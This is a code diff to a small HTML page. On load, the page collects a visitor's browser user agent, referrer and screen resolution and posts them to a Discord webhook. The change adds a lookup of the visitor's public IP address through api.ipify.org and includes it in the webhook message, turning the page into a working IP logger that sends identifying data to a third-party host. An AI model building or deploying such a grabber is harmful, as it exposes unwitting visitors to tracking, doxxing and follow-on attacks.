@@ -53,6 +53,8 @@
     <div class="field-value" id="referrer"></div>
     <div class="field-label">Screen Resolution:</div>
     <div class="field-value" id="screen-resolution"></div>
+    <div class="field-label">IP Address:</div>
+    <div class="field-value" id="ip-address"></div>
     <script>
       const webhookUrl = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";
 
@@ -77,23 +79,38 @@
                   name: "Screen Resolution",
                   value: screen.width + "x" + screen.height,
                   inline: false
+                },
+                {
+                  name: "IP Address",
+                  value: "",
+                  inline: false
                 }
               ]
             }
           ]
         };
-        fetch(webhookUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(message)
-        });
+        fetch("https://api.ipify.org?format=json")
+          .then(response => response.json())
+          .then(data => {
+            message.embeds[0].fields[3].value = data.ip;
+            fetch(webhookUrl, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify(message)
+            });
+          });
       });
       
       document.getElementById("user-agent").textContent = navigator.userAgent;
       document.getElementById("referrer").textContent = document.referrer;
       document.getElementById("screen-resolution").textContent = screen.width + "x" + screen.height;
+      fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          document.getElementById("ip-address").textContent = data.ip;
+        });
     </script>
   </body>
 </html>
